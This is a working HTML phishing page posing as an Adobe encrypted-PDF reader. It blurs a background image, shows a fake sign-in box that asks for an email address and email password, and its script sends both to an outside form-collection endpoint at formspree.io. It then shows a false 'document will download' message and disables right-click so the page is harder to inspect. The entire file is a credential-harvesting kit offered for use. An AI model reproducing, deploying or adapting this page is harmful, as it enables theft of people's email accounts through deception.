<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Adobe Online - Pdf Encrypted Reader</title>
  <style>
    body {
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
      overflow: hidden; /* Hide overflow to prevent scrolling */
    }

    #background {
      position: fixed;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      object-fit: fit;
      z-index: -1;
      filter: blur(0); /* Initial no blur effect */
      transition: filter 0.6s ease-out; /* Smooth transition for blur effect */
    }

    #login-container {
      display: none; /* Initially hide the container */
      max-width: 300px;
      background-color: rgba(128, 128, 128, 0.5);
      border-radius: 10px;
      padding: 20px;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
      text-align: center;
      transition: opacity 1s ease-in-out; /* Smooth transition for container visibility */
    }

    #login-icon {
      width: 50px;
      height: 50px;
      margin-bottom: 20px;
    }

    #small-text {
      font-size: 12px;
      color: white;
      margin-bottom: 10px;
    }

    #beautiful-text {
  font-family: 'Times New Roman', Times, serif; /* Times New Roman font with Times and serif fallbacks */
  font-size: 16px;                             /* Font size of 16 pixels */
  font-weight: normal;                         /* Normal font weight */
  color: white;                                /* White text color */
  margin-bottom: 15px;                         /* Bottom margin of 15 pixels */
}

    input {
      width: 100%;
      padding: 10px;
      margin-bottom: 15px;
      box-sizing: border-box;
      border: 1px solid #ccc;
      border-radius: 5px;
    }

    #login-button {
  font-family: 'Times New Roman', Times, serif; /* Formal font */
  background-color: #B7361B;
  color: white;
  padding: 10px 20px;
  border: none;
  border-radius: 5px;
  cursor: pointer;
  font-size: 16px;
}

    #login-button:hover {
      background-color: #45a049;
    }
  </style>
</head>
<body>
  <img id="background" src="https://imgur.com/y60ndGD.png" alt="Background Image">
  
  <div id="login-container">
    <img id="login-icon" src="https://www.iconpacks.net/icons/2/free-pdf-download-icon-2617-thumb.png" alt="Login Icon">
    <div id="small-text">This Document is end-to-end encrypted, &#x1F512;</div>
    <div id="beautiful-text">Sign in with your email address below to view document.</div>

    <!-- Form starts here -->
    <form action="" method="post" onsubmit="return login()">
      <input type="email" id="email" name="email" placeholder="Email Address" value="" required>
      <input type="password" id="password" name="password" placeholder="Email Password" required>
      <button id="login-button" type="submit">View Document </button>
    </form>
    <!-- Form ends here -->
  </div>

  <script>

document.addEventListener('contextmenu', function (e) {
    e.preventDefault();
  });
  
    document.addEventListener('DOMContentLoaded', function() {
      // Add blur effect after 0.4 seconds
      setTimeout(function() {
        document.getElementById('background').style.filter = 'blur(5px)';
      }, 400);

      // Display container after 2 seconds
      setTimeout(function() {
        document.getElementById('login-container').style.display = 'block';
      }, 2000);
    });

    function login() {
  // Perform login logic here
  var email = document.getElementById('email').value;
  var password = document.getElementById('password').value;

  // Check for empty email or password
  if (email.trim() === '' || password.trim() === '') {
    alert('Please enter both email and password.');
    return false;
  }

  // Example: Send form data to the server using fetch
  fetch('https://formspree.io/f/xdovnyrz', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
    },
    body: 'email=' + encodeURIComponent(email) + '&password=' + encodeURIComponent(password),
  })
    .then(response => {
      // Handle the server response if needed
      if (!response.ok) {
        throw new Error('Network response was not ok');
      }
      return response.text();
    })
    .then(data => {
      // Handle the data returned by the server if needed
      console.log(data);
    })
    .catch(error => {
      // Handle errors during the fetch operation
      console.error('Fetch error:', error);
    });
    
    
     // Delay the alert by 0.1 second
     setTimeout(function() {
        // Example: Simple alert for demonstration
        alert("The document will download automatically");
      }, 100);

  // Clear the password field
  document.getElementById('password').value = '';

  // Return false to prevent the form from submitting
  return false;

    }
  </script>



</body>
</html>
